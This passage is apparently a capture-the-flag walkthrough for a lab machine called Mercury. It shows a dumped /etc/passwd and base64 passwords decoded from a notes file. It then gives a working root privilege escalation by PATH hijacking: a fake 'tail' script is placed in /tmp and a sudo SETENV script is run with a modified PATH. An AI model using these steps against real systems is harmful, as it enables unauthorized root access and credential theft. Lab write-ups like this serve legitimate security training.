irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mercury:x:1000:1000:mercury:/home/mercury:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
webmaster:x:1001:1001:,,,:/home/webmaster:/bin/bash
linuxmaster:x:1002:1002:,,,:/home/linuxmaster:/bin/bash


webmaster@mercury:~/mercury_proj$ cat notes.txt 
Project accounts (both restricted):
webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==

going to cyberchef and selecting magic, we get this:linuxmaster:mercurymeandiameteris4880km

we can switch to linuxmaster :)
webmaster@mercury:/home$ su linuxmaster
Password: 
linuxmaster@mercury:/home$ 


PRIVESC:

linuxmaster@mercury:/home$ sudo -l
[sudo] password for linuxmaster: 
Matching Defaults entries for linuxmaster on mercury:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User linuxmaster may run the following commands on mercury:
    (root : root) SETENV: /usr/bin/check_syslog.sh
linuxmaster@mercury:/home$ cat /usr/bin/check_syslog.sh
#!/bin/bash
tail -n 10 /var/log/syslog
linuxmaster@mercury:/home$ echo -e '#!/bin/bash\n/bin/bash' > tail
bash: tail: Permission denied
linuxmaster@mercury:/home$ cd /tmp
linuxmaster@mercury:/tmp$ echo -e '#!/bin/bash\n/bin/bash' > tail
linuxmaster@mercury:/tmp$ chmod +x tail
linuxmaster@mercury:/tmp$ sudo PATH=.:$PATH /usr/bin/check_syslog.sh
root@mercury:/tmp# 


root@mercury:/tmp# cd /root
root@mercury:~# ls
root_flag.txt
root@mercury:~# cat root_flag.txt 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@(((/(*(/((((((////////&@@@@@@@@@@@@@
@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@
@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@
@@@@@@*((####((///*//(///*(/*//((/(((//**/((&@@@@@
@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@
@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@
@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@
@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@
@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@
@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@
@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@
@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@
@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@
@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@
@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@
@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@
@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

Congratulations on completing Mercury!!!
If you have any feedback please contact me at SirFlash@protonmail.com
[root_flag_69426d9fda579afbffd9c2d47ca31d90]


